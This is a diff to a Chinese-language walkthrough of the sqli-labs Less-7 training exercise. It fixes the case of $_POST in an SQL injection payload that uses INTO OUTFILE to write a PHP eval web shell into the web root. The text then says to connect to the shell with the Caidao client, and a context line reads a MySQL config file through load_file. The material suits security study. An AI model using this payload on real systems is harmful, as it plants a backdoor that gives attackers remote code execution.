@@ -171,7 +171,7 @@ select load_file(‘c:\\wamp\\bin\\mysql\\mysql5.6.17\\my.ini’)into outfile �
 ```
 写一句话：     
 ```
-?id=1')) union select 1,2,'<?php @eval($_post["mima"])?>' into outfile "C:\\xampp\\htdocs\\sqli-labs-php7\\Less-7\\7.php"--+
+?id=1')) union select 1,2,'<?php @eval($_POST["mima"])?>' into outfile "C:\\xampp\\htdocs\\sqli-labs-php7\\Less-7\\7.php"--+
 ```
 即在Less-7目录下写入7.php文件。
 用菜刀连接即可。
